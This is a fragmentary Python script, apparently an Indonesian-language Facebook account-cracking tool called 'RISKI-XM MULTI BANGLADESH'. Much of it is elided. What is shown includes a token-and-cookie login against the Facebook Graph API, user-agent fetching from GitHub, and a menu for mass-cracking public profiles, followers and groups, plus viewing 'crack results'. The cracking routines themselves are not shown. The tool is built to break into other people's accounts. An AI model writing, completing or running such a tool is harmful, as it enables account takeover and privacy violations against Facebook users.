...
#
author ='RISKI X'
github ='https://github.com/RISKI-X'
#
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/RISKI-X-ID/CRACK/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
def banner():
	riski_x('=' * 40)
	print(f"""{Z}[•] RISKI-XM MULTI BANGLADESH [•]
{h}  _____ ____        
{h} |  ___| __ )
{h} | |_  |  _ \    VERSION:0.1
{h} |  _| | |_) |   RISKI-X
...
def login():
	try:
		...
		try:
			riskiheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			baslovesyafa = json.loads(riskiheker.text)['name']
			basganteng = json.loads(riskiheker.text)['id']
...
def menu(my_name,my_id):
	...
	riski_x(f'[>] ID  : '+str(my_id))
	riski_x(f'[>] IP  : {ip}')
	#riski_x(f' Github   : RISKI-X')
	riski_x('=' * 40)
	cetak(' [•] 1. Crack Publik Massal\n [•] 2. Crack Followers\n [•] 3. Crack Group\n [•] 4. Hasil Crack\n [•] 5. Chat Author\n [•] 0. Keluar')
	riski_x('=' * 40)
	riski_sayang_abel= input('[?] Pilih : ')
	riski_x('=' * 40)
	if riski_sayang_abel in ['1']:
		dump_massal()
	elif riski_sayang_abel in ['2']:
		dump_pengikut()
	elif riski_sayang_abel in ['3']:
		grup()
	elif riski_sayang_abel in ['4']:
		result()
	elif riski_sayang_abel in ['5']:
		authorbas()
	elif riski_sayang_abel in ['0']:
		...
		back()
def authorbas():
	riskix(f'{sir}[!] Tunggu Bentar cuk Ntar Diarahin Ke Facebook  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/profile.php?id=100087678753998")
	back()
...
###>[ CRACK GRUP FB ]<###
def grup():
	riski_x(f'{b}[!] Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
	time.sleep(4)
	back()
...
###>[ METHOD LOGIN ]<###
	...
	print('[•] 2. Method V2 ')
	riski_x('=' * 40)
	riskifaa = input('[?] Pilih : ')
	if riskifaa in ['1','01']:
		method.append('mobile')
	elif riskifaa in ['']:
		print('[!] Pilih Yang Bener Lah ')
		setting()
	elif riskifaa in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	riski_x('=' * 40)
...
if __name__=='__main__':
	...
	riski_x(f'\n\t{x} {h} HALLO KASIH BINTANG ASW :v{x}')
	time.sleep(3)
	login()